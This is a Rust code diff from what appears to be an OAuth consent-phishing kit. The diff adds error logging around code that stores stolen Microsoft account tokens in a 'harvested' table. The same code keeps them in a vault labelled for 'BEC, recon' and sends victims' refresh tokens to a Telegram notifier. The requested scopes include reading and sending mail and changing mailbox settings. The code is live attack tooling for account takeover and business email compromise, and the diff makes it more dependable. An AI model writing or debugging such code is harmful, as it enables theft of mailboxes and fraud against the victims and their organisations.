@@ -524,7 +524,7 @@ async fn exchange_code(
                 
                 println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_id, account_type);
                 // Store in harvested table (legacy, for dashboard display)
-                sqlx::query(
+                match sqlx::query(
                     "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
@@ -541,10 +541,12 @@ async fn exchange_code(
                 .bind(&account_type)
                 .bind(Option::<chrono::DateTime<Utc>>::None)
                 .execute(&state.pool)
-                .await
-                .ok();
+                .await {
+                    Ok(result) => println!("[exchange] Inserted into harvested table: {} rows affected", result.rows_affected()),
+                    Err(e) => eprintln!("[exchange] ERROR inserting into harvested table: {}", e),
+                }
                 // Also store in encrypted tokens table (for scheduler refresh, BEC, recon, etc.)
-                let _ = state.vault.store_token(
+                match state.vault.store_token(
                     &state.pool,
                     &id,
                     &email_str,
@@ -553,7 +555,10 @@ async fn exchange_code(
                     vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "Contacts.Read".to_string(), "MailboxSettings.ReadWrite".to_string()],
                     refresh_expires_at,
                     account_type.as_deref(),
-                ).await;
+                ).await {
+                    Ok(token_id) => println!("[exchange] Stored encrypted token in vault: {}", token_id),
+                    Err(e) => eprintln!("[exchange] ERROR storing encrypted token in vault: {}", e),
+                }
                 if let Some(email) = email {
                     send_telegram_notification(&state.config, refresh_token, &email).await;
                 }
